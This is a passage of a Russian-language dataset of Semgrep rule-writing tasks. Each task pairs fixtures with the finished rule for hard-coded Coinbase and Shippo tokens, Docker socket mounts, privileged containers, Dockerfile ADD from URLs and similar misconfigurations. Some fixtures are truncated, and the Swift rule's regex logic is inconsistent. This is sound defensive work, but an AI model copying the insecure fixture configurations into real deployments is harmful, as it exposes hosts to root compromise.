    "output": "rules:\n- id: coinbase-access-token\n  message: A gitleaks coinbase-access-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)(?:coinbase)(?:[0-9a-z\\-_\\t .]{0,20})(?:[\\s|']|[\\s|\"]){0,3}(?:=|>|:{1,3}=|\\|\\|:|<=|=>|:|\\?=)(?:'|\\\"|\\s|=|\\x60){0,5}([a-z0-9_-]{64})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированного токена доступа Coinbase в исходном коде. Регулярное выражение ищет строку, содержащую слово 'coinbase' в любом регистре, за которым следуют случайные символы длиной 64 символа, представляющие собой токен доступа. Правило применимо к языкам, поддерживающим регулярные выражения, таким как Go, и предназначено для выявления жесткого кодирования секретных ключей или токенов доступа, которые могут быть случайно раскрыты через репозиторий исходного кода.\n\n# Ключевые элементы:\n- ID: coinbase-access-token\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "coinbase-access-token",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: prefer-copy-over-add\nОписание уязвимости: The ADD command will accept and include files from a URL and automatically extract archives. This potentially exposes the container to a man-in-the-middle attack or other attacks if a malicious actor can tamper with the source archive. Since ADD can have this and other unexpected side effects, the use of the more explicit COPY command is preferred.\nCWE: \nТип анализа: search\nЯзык: dockerfile",
    "input": "Требования:\n- Язык: dockerfile\n- Тип анализа: search\n- CWE: \n- Серьезность: INFO\n\nКонтекст кода:\n// File: prefer-copy-over-add.dockerfile\nFROM busybox\n\n# ruleid: prefer-copy-over-add\nADD http://foo bar\n\n# ruleid: prefer-copy-over-add\nADD https://foo bar\n\n# ruleid: prefer-copy-over-add\nADD foo.tar.gz bar\n\n# ruleid: prefer-copy-over-add\nADD foo.bz2 bar\n\n# ok: prefer-copy-over-add\nADD foo bar\n\n# ok: prefer-copy-over-add\nADD foo* /mydir/\n\n# ok: prefer-copy-over-add\nADD hom?.txt /mydir/o\n\n# ok: prefer-copy-over-add\nADD arr[[]0].txt /mydir/o\n\n# ok: prefer-copy-over-add\nADD --chown=55:mygroup files* /somedir/\n\n# ok: prefer-copy-over-add\nADD --chown=bin files* /somedir/  # Ограничиваем длину\n\nОпасные паттерны:\n• ADD http://foo bar\n• ADD https://foo bar\n• ADD foo.tar.gz bar\n\nБезопасные паттерны:  \n• ADD foo bar\n• ADD foo* /mydir/\n• ADD hom?.txt /mydir/o\n\nЛегенда аннотаций:\n- // ruleid:prefer-copy-over-add: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:prefer-copy-over-add: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: prefer-copy-over-add\n    severity: INFO\n    languages: [dockerfile]\n    message: >-\n      The ADD command will accept and include files from a URL and automatically extract\n      archives. This potentially exposes the container to a man-in-the-middle attack or\n      other attacks if a malicious actor can tamper with the source archive. Since\n      ADD can have this and other unexpected side effects, the use of the more explicit\n      COPY command is preferred.\n    metadata:\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html\n      category: best-practice\n      technology:\n        - dockerfile\n    patterns:\n      - pattern: |\n          ADD $FROM $TO\n      - metavariable-regex:\n          metavariable: $FROM\n          regex: (^[A-Za-z]+:\\/\\/|.*[.](gz|bz2|zip|tar)$)\n      - focus-metavariable: $FROM\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования команды ADD в Dockerfile, которая принимает файлы из URL или архивов. Паттерн ищет строку 'ADD', за которой следует источник ($FROM), содержащий URL или расширение архива (.gz, .bz2, .zip, .tar). Это считается небезопасным, так как ADD автоматически распаковывает архивы и может подвергнуть контейнер атаке типа man-in-the-middle или другим угрозам. Безопасной альтернативой является явное использование команды COPY.\n\n# Ключевые элементы:\n- ID: prefer-copy-over-add\n- Язык: dockerfile \n- Тип: \n- Серьезность: INFO",
    "metadata": {
      "rule_id": "prefer-copy-over-add",
      "language": "dockerfile",
      "severity": "INFO",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения aws-imagebuilder-component-encrypted-with-cmk\nОписание уязвимости: Ensure ImageBuilder component is encrypted at rest using KMS CMKs. CMKs gives you control over the encryption key in terms of access and rotation.\nCWE: CWE-320: CWE CATEGORY: Key Management Errors\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-320: CWE CATEGORY: Key Management Errors\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: aws-imagebuilder-component-encrypted-with-cmk.tf\n# ruleid: aws-imagebuilder-component-encrypted-with-cmk\nresource \"aws_imagebuilder_component\" \"fail\" {\n  data = yamlencode({\n    phases = [{\n      name = \"build\"\n      steps = [{\n        action = \"ExecuteBash\"\n        inputs = {\n          commands = [\"echo 'hello world'\"]\n        }\n        name      = \"example\"\n        onFailure = \"Continue\"\n      }]\n    }]\n    schemaVersion = 1.0\n  })\n  name       = \"examplea\"\n  platform   = \"Linux\"\n  version    = \"1.0.0\"\n}\n\nresource \"aws_imagebuilder_component\" \"pass\" {\n  data = yamlencode({\n    phases = [{\n      name = \"build\"\n      steps = [{\n        action = \"ExecuteBash\"\n        inputs = {\n          commands = [\"echo 'hello world'\"]\n        }\n        name      = \"example\"\n        onFailure = \"Continue\"\n      }]\n    }]\n    schemaVersion = 1.0\n  })\n  kms_key_id = aws_kms_key.test.arn\n  name       = \"examplea\"\n  platform   = \"Linux\"\n  version    = \"1.0.0\"\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"aws_imagebuilder_component\" \"fail\" { ... }\n• resource \"aws_imagebuilder_component\" \"another_fail\" { ... }\n\nБезопасные паттерны:  \n• resource \"aws_imagebuilder_component\" \"pass\" { kms_key_id = aws_kms_key.test.arn ... }\n• resource \"aws_imagebuilder_component\" \"safe_pass\" { kms_key_id = var.kms_arn ... }\n\nЛегенда аннотаций:\n- // ruleid:aws-imagebuilder-component-encrypted-with-cmk: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:aws-imagebuilder-component-encrypted-with-cmk: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: aws-imagebuilder-component-encrypted-with-cmk\n  patterns:\n  - pattern: |\n      resource \"aws_imagebuilder_component\" $ANYTHING {\n        ...\n      }\n  - pattern-not-inside: |\n      resource \"aws_imagebuilder_component\" $ANYTHING {\n        ...\n        kms_key_id = ...\n        ...\n      }\n  message: >-\n    Ensure ImageBuilder component is encrypted at rest using KMS CMKs. CMKs gives you control over the\n    encryption key in terms of access and rotation.\n  metadata:\n    category: security\n    technology:\n    - terraform\n    - aws\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    cwe:\n    - 'CWE-320: CWE CATEGORY: Key Management Errors'\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов AWS ImageBuilder компонента, которые не используют идентификатор ключа шифрования KMS (kms_key_id) внутри блока ресурса. Правило состоит из двух частей: основной шаблон ищет ресурсы ImageBuilder компонента, а отрицательный шаблон внутри исключает случаи, когда ключ KMS явно указан. Это позволяет обнаружить ситуации, где компонент не зашифрован с использованием управляемого ключа KMS.\n\n# Ключевые элементы:\n- ID: aws-imagebuilder-component-encrypted-with-cmk\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "aws-imagebuilder-component-encrypted-with-cmk",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: swift-webview-config-allows-js-open-windows\nОписание уязвимости: Webviews were observed that explictly allow JavaScript in an WKWebview to open windows automatically. Consider disabling this functionality if not required, following the principle of least privelege.\nCWE: CWE-272: Least Privilege Violation\nТип анализа: search\nЯзык: swift",
    "input": "Требования:\n- Язык: swift\n- Тип анализа: search\n- CWE: CWE-272: Least Privilege Violation\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: webview-js-window.swift\nlet prefs = WKPreferences()\n// ruleid: swift-webview-config-allows-js-open-windows\nprefs.JavaScriptCanOpenWindowsAutomatically  = true\nlet config = WKWebViewConfiguration()\nconfig.defaultWebpagePreferences = prefs\n\nWKWebView(frame: .zero, configuration: config)\n\nlet prefs2 = WKPreferences()\nprefs2.JavaScriptCanOpenWindowsAutomatically  = true\n// okid: swift-webview-config-allows-js-open-windows\nprefs2.JavaScriptCanOpenWindowsAutomatically  = false\nlet config = WKWebViewConfiguration()\nconfig.defaultWebpagePreferences = prefs2\n\nWKWebView(frame: .zero, configuration: config)  # Ограничиваем длину\n\nОпасные паттерны:\n• let prefs = WKPreferences()\nprefs.JavaScriptCanOpenWindowsAutomatically  = true\nlet config = WKWebViewConfiguration()\nconfig.defaultWebpagePreferences = prefs\n• let prefs = WKPreferences()\nprefs.JavaScriptCanOpenWindowsAutomatically  = false\nprefs.JavaScriptCanOpenWindowsAutomatically  = true\nlet config = WKWebViewConfiguration()\nconfig.defaultWebpagePreferen\n\nБезопасные паттерны:  \n• let prefs = WKPreferences()\nprefs.JavaScriptCanOpenWindowsAutomatically  = false\nlet config = WKWebViewConfiguration()\nconfig.defaultWebpagePreferences = prefs\n• let prefs = WKPreferences()\nprefs.JavaScriptCanOpenWindowsAutomatically  = true\nprefs.JavaScriptCanOpenWindowsAutomatically  = false\nlet config = WKWebViewConfiguration()\nconfig.defaultWebpagePreferen\n\nЛегенда аннотаций:\n- // ruleid:swift-webview-config-allows-js-open-windows: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:swift-webview-config-allows-js-open-windows: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: swift-webview-config-allows-js-open-windows\n  message: >-\n    Webviews were observed that explictly allow JavaScript in an WKWebview to open windows automatically.\n    Consider disabling this functionality if not required, following the principle of least privelege.\n  severity: WARNING\n  metadata:\n    likelihood: LOW\n    impact: LOW\n    confidence: HIGH\n    category: security\n    cwe:\n    - 'CWE-272: Least Privilege Violation'\n    masvs:\n    - 'MASVS-PLATFORM-2: The app uses WebViews securely'\n    references:\n    - https://mas.owasp.org/MASVS/controls/MASVS-PLATFORM-2/\n    - https://developer.apple.com/documentation/webkit/wkpreferences/1536573-javascriptcanopenwindowsautomati\n    subcategory:\n    - audit\n    technology:\n    - ios\n    - macos\n  languages:\n  - swift\n  patterns:\n  - pattern: |\n      $P = WKPreferences()\n      ...\n  - pattern-either:\n    - patterns:\n      - pattern-inside: |\n          $P.JavaScriptCanOpenWindowsAutomatically  = $FALSE\n          ...\n          $P.JavaScriptCanOpenWindowsAutomatically  = $TRUE\n      # nosemgrep\n      - pattern-not-inside: |\n          ...\n          $P.JavaScriptCanOpenWindowsAutomatically  = $TRUE\n          ...\n          $P.JavaScriptCanOpenWindowsAutomatically = $FALSE\n      - pattern: |\n          $P.JavaScriptCanOpenWindowsAutomatically  = true\n      - metavariable-regex:\n          metavariable: $TRUE\n          regex: ^(true)$\n      - metavariable-regex:\n          metavariable: $TRUE\n          regex: (.*(?!true))\n    - patterns:\n      - pattern: |\n          $P.JavaScriptCanOpenWindowsAutomatically  = true\n      # nosemgrep\n      - pattern-not-inside: |\n          ...\n          $P.JavaScriptCanOpenWindowsAutomatically  = ...\n          ...\n          $P.JavaScriptCanOpenWindowsAutomatically  = ...\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска случаев, когда объект WKPreferences используется для настройки веб-вьюшки (WKWebView) таким образом, что разрешает автоматическое открытие окон JavaScript. Правило ищет присвоение значения true переменной JavaScriptCanOpenWindowsAutomatically внутри объекта WKPreferences. Также учитываются случаи, где значение сначала установлено как false, а затем изменено на true. Дополнительно проверяется отсутствие последовательных присваиваний, где первое значение равно true, а второе — false, используя метапеременную $TRUE и оператор pattern-inside.\n\n# Ключевые элементы:\n- ID: swift-webview-config-allows-js-open-windows\n- Язык: swift \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "swift-webview-config-allows-js-open-windows",
      "language": "swift",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения exposing-docker-socket-volume\nОписание уязвимости: Exposing host's Docker socket to containers via a volume. The owner of this socket is root. Giving someone access to it is equivalent to giving unrestricted root access to your host. Remove 'docker.sock' from volumes to prevent this.\nCWE: CWE-250: Execution with Unnecessary Privileges\nТип анализа: search\nЯзык: yaml",
    "input": "Требования:\n- Язык: yaml\n- Тип анализа: search\n- CWE: CWE-250: Execution with Unnecessary Privileges\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: exposing-docker-socket-volume.test.yaml\nversion: \"3.9\"\nservices:\n  service01:\n    image: nginx:alpine\n    # ok: exposing-docker-socket-volume\n    volumes:\n      - /tmp/foo:/tmp/foo\n      - /tmp/bar:/tmp/bar\n  service02:\n    image: my-worker-image:latest\n    # ruleid: exposing-docker-socket-volume\n    volumes:\n      - /tmp/foo:/tmp/foo\n      - /var/run/docker.sock:/var/run/docker.sock\n  service03:\n    image: mysql\n    # ruleid: exposing-docker-socket-volume\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n      - /tmp/foo:/tmp/foo\n  service04:\n    image: redis\n    # ruleid: exposing-docker-socket-volume\n    volumes:\n      - /tmp/foo:/tmp/foo\n      - /var/run/docker.sock:/var/run/docker.sock\n      - /tmp/bar:/tmp/bar\n  service05:\n    image: ubuntu\n    # ruleid: exposing-docker-socket-volume\n    volumes:\n      - /tmp/foo:/tmp/foo\n      - /run/docker.sock:/run/docker.sock\n  service06:\n    image: debian:bullseye\n    # ruleid: exposing-docker-socket-volume\n    volumes:\n      - /run/docker.sock:/run/docker.sock\n      - /tmp/foo:/tmp/foo\n  service07:\n    image: debian:buster\n    # ruleid: exposing-docker-socket-volume\n    volumes:\n      - /tmp/foo:/tmp/foo\n      - /run/docker.sock:/run/docker.sock\n      - /tmp/bar:/tmp/bar\n  service08:\n    image: python:3.10\n    # ruleid: exposing-docker-socket-volume\n    volumes:\n      - /tmp/foo:/tmp/foo\n      - /var/run/docker.sock:/run/docker.sock\n  service09:\n    image: python:3.9\n    # ruleid: exposing-docker-socket-volume\n    volumes:\n      - /var/run/docker.sock:/run/docker.sock\n      - /tmp/foo:/tmp/foo\n  service10:\n    image: ruby:3\n    # ruleid: exposing-docker-socket-volume\n    volumes:\n      - /tmp/foo:/tmp/foo\n      - /var/run/docker.sock:/run/docker.sock\n      - /tmp/bar:/tmp/bar\n  service11:\n    image: postgres:14\n    # ruleid: exposing-docker-socket-volume\n    volumes:\n      - /tmp/foo:/tmp/foo\n      - /run/docker.sock:/var/run/docker.sock\n  service12:\n    image: random:thing\n    # ruleid: exposing-do  # Ограничиваем длину\n\nОпасные паттерны:\n• volumes:\n  - /var/run/docker.sock:/var/run/docker.sock\n  - /tmp/foo:/tmp/foo\n• volumes:\n  - /run/docker.sock:/run/docker.sock\n  - /tmp/bar:/tmp/bar\n• volumes:\n  - /var/run/docker.sock:/run/docker.sock\n  - /tmp/foo:/tmp/foo\n\nБезопасные паттерны:  \n• volumes:\n  - /tmp/foo:/tmp/foo\n• volumes:\n  - /tmp/bar:/tmp/bar\n• volumes:\n  - /tmp/foo\n  - /tmp/bar\n\nЛегенда аннотаций:\n- // ruleid:exposing-docker-socket-volume: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:exposing-docker-socket-volume: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: exposing-docker-socket-volume\n  patterns:\n  - pattern-inside: |\n      version: ...\n      ...\n  - pattern-either:\n    - pattern: |\n        volumes:\n          - ...\n          - /var/run/docker.sock:/var/run/docker.sock\n          - ...\n    - pattern: |\n        volumes:\n          - ...\n          - /run/docker.sock:/run/docker.sock\n          - ...\n    - pattern: |\n        volumes:\n          - ...\n          - /var/run/docker.sock:/run/docker.sock\n          - ...\n    - pattern: |\n        volumes:\n          - ...\n          - /run/docker.sock:/var/run/docker.sock\n          - ...\n    - pattern: |\n        volumes:\n          - ...\n          - /var/run/docker.sock\n          - ...\n    - pattern: |\n        volumes:\n          - ...\n          - /run/docker.sock\n          - ...\n    - pattern: |\n        volumes:\n          - ...\n          - ...\n            source: /var/run/docker.sock\n            ...\n          - ...\n    - pattern: |\n        volumes:\n          - ...\n          - ...\n            source: /run/docker.sock\n            ...\n          - ...\n  message: >-\n    Exposing host's Docker socket to containers via a volume. The owner of this\n    socket is root. Giving someone access to it is equivalent to giving\n    unrestricted root access to your host. Remove 'docker.sock' from volumes to\n    prevent this.\n  metadata:\n    references:\n    - https://docs.docker.com/compose/compose-file/compose-file-v3/#volume-configuration-reference\n    - https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html#rule-1-do-not-expose-the-docker-daemon-socket-even-to-the-containers\n    category: security\n    technology:\n    - docker-compose\n    cwe:\n    - 'CWE-250: Execution with Unnecessary Privileges'\n    owasp:\n    - A06:2017 - Security Misconfiguration\n    - A05:2021 - Security Misconfiguration\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n    confidence: LOW\n  languages: [yaml]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конфигураций Docker Compose, где контейнеры получают доступ к сокету Docker через объем. Сокет Docker имеет владельца root и предоставляет неограниченный доступ к хост-системе при доступе извне контейнера. Правило ищет явное указание на использование путей /var/run/docker.sock или /run/docker.sock в конфигурации объема, а также косвенное указание через атрибут 'source', который может указывать на путь к сокету Docker.\n\n# Ключевые элементы:\n- ID: exposing-docker-socket-volume\n- Язык: yaml \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "exposing-docker-socket-volume",
      "language": "yaml",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения semgrep-github-action-push-without-branches\nОписание уязвимости: The 'branches' field (in the push event configuration) contains no branches. This causes all branches to be scanned and may result in unneccessary duplicate findings across the entire codebase.\nCWE: \nТип анализа: search\nЯзык: yaml",
    "input": "Требования:\n- Язык: yaml\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: semgrep-github-action-push-without-branches.test.yml\n---\non:\n  pull_request: {}\n  push:\n    # ok: semgrep-github-action-push-without-branches\n    branches:\n    - main\nname: Semgrep\njobs:\n  semgrep:\n    name: Scan\n    runs-on: ubuntu-latest\n    steps:\n    - uses: actions/checkout@v2\n    - uses: returntocorp/semgrep-action@v1\n      with:\n        publishToken: abc\n\n\n---\non:\n  pull_request: {}\n  push:\n    # ruleid: semgrep-github-action-push-without-branches\n    branches:\nname: Semgrep\njobs:\n  semgrep:\n    name: Scan\n    runs-on: ubuntu-latest\n    steps:\n    - uses: actions/checkout@v2\n    - uses: returntocorp/semgrep-action@v1\n      with:\n        publishToken: abc  # Ограничиваем длину\n\nОпасные паттерны:\n• on:\n  push:\n    branches: {}\njobs:\n  semgrep:\n    runs-on: ubuntu-latest\n    steps:\n    - uses: returntocorp/semgrep-action@v1\n      with:\n        publishToken: abc\n• on:\n  push:\n    branches: []\njobs:\n  semgrep:\n    runs-on: ubuntu-latest\n    steps:\n    - uses: returntocorp/semgrep-action@v1\n      with:\n        publishToken: abc\n\nБезопасные паттерны:  \n• on:\n  push:\n    branches:\n    - main\njobs:\n  semgrep:\n    runs-on: ubuntu-latest\n    steps:\n    - uses: returntocorp/semgrep-action@v1\n      with:\n        publishToken: abc\n• on:\n  push:\njobs:\n  semgrep:\n    runs-on: ubuntu-latest\n    steps:\n    - uses: returntocorp/semgrep-action@v1\n      with:\n        publishToken: abc\n\nЛегенда аннотаций:\n- // ruleid:semgrep-github-action-push-without-branches: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:semgrep-github-action-push-without-branches: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: semgrep-github-action-push-without-branches\n    message: The 'branches' field (in the push event configuration) contains no\n      branches. This causes all branches to be scanned and may result in\n      unneccessary duplicate findings across the entire codebase.\n    severity: WARNING\n    languages:\n      - yaml\n    paths:\n      include:\n        - \"/.github/workflows/semgrep.yml\"\n        - \"*.test.yml\"\n    patterns:\n      - pattern-either:\n          - pattern: |\n              on: [..., push, ...]\n              ...\n          - pattern: |\n              on: push\n              ...\n          - pattern: |\n              on:\n                ...\n                push: \"\"\n                ...\n              ...\n          - pattern: |\n              on:\n                ...\n                push: {}\n                ...\n              ...\n          - patterns:\n              - pattern-inside: |\n                  on:\n                    ...\n                    push: ...\n                    ...\n                  ...\n              - pattern-either:\n                  - pattern: |\n                      branches: \"\"\n                  - pattern: |\n                      branches: []\n    metadata:\n      category: correctness\n      technology:\n        - github-action\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конфигураций GitHub Actions, где событие 'push' не указывает конкретные ветви ('branches'). В результате сканируются все ветви, что может привести к избыточным и ненужным результатам анализа во всем репозитории. Правило использует комбинацию шаблонов YAML для охвата различных синтаксических форм описания события 'push'. Шаблоны включают отсутствие списка ветвей или пустой список, а также отсутствие явного указания поля 'branches'.\n\n# Ключевые элементы:\n- ID: semgrep-github-action-push-without-branches\n- Язык: yaml \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "semgrep-github-action-push-without-branches",
      "language": "yaml",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: privileged-container\nОписание уязвимости: Container or pod is running in privileged mode. This grants the container the equivalent of root capabilities on the host machine. This can lead to container escapes, privilege escalation, and other security concerns. Remove the 'privileged' key to disable this capability.\nCWE: CWE-250: Execution with Unnecessary Privileges\nТип анализа: search\nЯзык: yaml",
    "input": "Требования:\n- Язык: yaml\n- Тип анализа: search\n- CWE: CWE-250: Execution with Unnecessary Privileges\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: privileged-container.test.yaml\napiVersion: v1\nkind: Pod\nspec:\n  # ruleid: privileged-container\n  privileged: true\n  containers:\n    # ruleid: privileged-container\n    - name: nginx\n      image: nginx\n      securityContext:\n        privileged: true\n    # ok: privileged-container\n    - name: postgres\n      image: postgres\n    # ok: privileged-container\n    - name: redis\n      image: redis\n      securityContext:\n        privileged: false  # Ограничиваем длину\n\nОпасные паттерны:\n• apiVersion: v1\nkind: Pod\nspec:\n  privileged: true\n  containers:\n    - name: nginx\n      image: nginx\n      securityContext:\n        privileged: true\n• apiVersion: v1\nkind: Pod\nspec:\n  containers:\n    - name: nginx\n      image: nginx\n      securityContext:\n        privileged: true\n\nБезопасные паттерны:  \n• apiVersion: v1\nkind: Pod\nspec:\n  containers:\n    - name: nginx\n      image: nginx\n      securityContext:\n        privileged: false\n• apiVersion: v1\nkind: Pod\nspec:\n  privileged: false\n  containers:\n    - name: nginx\n      image: nginx\n\nЛегенда аннотаций:\n- // ruleid:privileged-container: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:privileged-container: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: privileged-container\n  pattern-either:\n  - patterns:\n    - pattern-inside: |\n        containers:\n          ...\n    - pattern: |\n        image: ...\n        ...\n        securityContext:\n          ...\n          privileged: true\n  - patterns:\n    - pattern-inside: |\n        spec:\n          ...\n    - pattern-not-inside: |\n        image: ...\n        ...\n    - pattern: |\n        privileged: true\n  message: >-\n    Container or pod is running in privileged mode. This grants the\n    container the equivalent of root capabilities on the host machine. This\n    can lead to container escapes, privilege escalation, and other security\n    concerns. Remove the 'privileged' key to disable this capability.\n  metadata:\n    cwe:\n    - 'CWE-250: Execution with Unnecessary Privileges'\n    references:\n    - https://kubernetes.io/docs/concepts/policy/pod-security-policy/#privileged\n    - https://kubernetes.io/docs/tasks/configure-pod-container/security-context/\n    - https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html\n    category: security\n    technology:\n    - kubernetes\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages: [yaml]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска контейнеров или подов Kubernetes, запущенных в привилегированном режиме ('privileged: true'). Анализ выполняется путем проверки наличия ключа 'privileged' внутри блока 'containers' или 'spec'. Если ключ присутствует и имеет значение 'true', то это считается опасным состоянием, так как предоставляет контейнеру эквивалент прав root на хост-машине, что может привести к побегу контейнера, эскалации привилегий и другим угрозам безопасности.\n\n# Ключевые элементы:\n- ID: privileged-container\n- Язык: yaml \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "privileged-container",
      "language": "yaml",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: missing-zypper-clean\nОписание уязвимости: This zypper command does not end with '&& zypper clean'. Running 'zypper clean' will remove cached data and reduce package size. (This must be performed in the same RUN step.)\nCWE: \nТип анализа: search\nЯзык: dockerfile",
    "input": "Требования:\n- Язык: dockerfile\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: missing-zypper-clean.dockerfile\n# cf. https://github.com/hadolint/hadolint/wiki/DL3036\n\nFROM opensuse/leap:15.2\n# ruleid: missing-zypper-clean\nRUN zypper install -y httpd=2.4.46\n# ok: missing-zypper-clean\nRUN zypper install -y httpd=2.4.46 && zypper clean\n# ok: missing-zypper-clean\nRUN zypper install -y httpd=2.4.46 && \\\n  zypper clean  # Ограничиваем длину\n\nОпасные паттерны:\n• RUN zypper install -y httpd=2.4.46\n• RUN zypper install -y httpd=2.4.46 && zypper update\n\nБезопасные паттерны:  \n• RUN zypper install -y httpd=2.4.46 && zypper clean\n• RUN zypper install -y httpd=2.4.46 && \\\n  zypper clean\n\nЛегенда аннотаций:\n- // ruleid:missing-zypper-clean: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:missing-zypper-clean: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: missing-zypper-clean\n    severity: WARNING\n    languages: [dockerfile]\n    patterns:\n      - pattern: RUN ... zypper $COMMAND ...\n      - pattern-not-inside: RUN ... zypper clean\n      - pattern-not-inside: RUN ... zypper clean\n    message: >-\n      This zypper command does not end with '&& zypper clean'. Running 'zypper clean' will remove cached data and reduce package size. (This must be performed in the same RUN step.)\n    metadata:\n      source-rule-url: https://github.com/hadolint/hadolint/wiki/DL3036\n      references:\n        - https://github.com/hadolint/hadolint/wiki/DL3036\n      category: best-practice\n      technology:\n        - dockerfile\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска Dockerfile инструкций RUN, содержащих команду zypper установки пакетов, но не завершающихся командой zypper clean. Паттерн ищет инструкции RUN, содержащие zypper и команду установки ($COMMAND), при этом проверяет отсутствие внутри этих инструкций команд zypper clean. Если команда zypper clean отсутствует, выдается предупреждение о необходимости выполнения очистки после установки.\n\n# Ключевые элементы:\n- ID: missing-zypper-clean\n- Язык: dockerfile \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "missing-zypper-clean",
      "language": "dockerfile",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения shippo-api-token\nОписание уязвимости: A gitleaks shippo-api-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
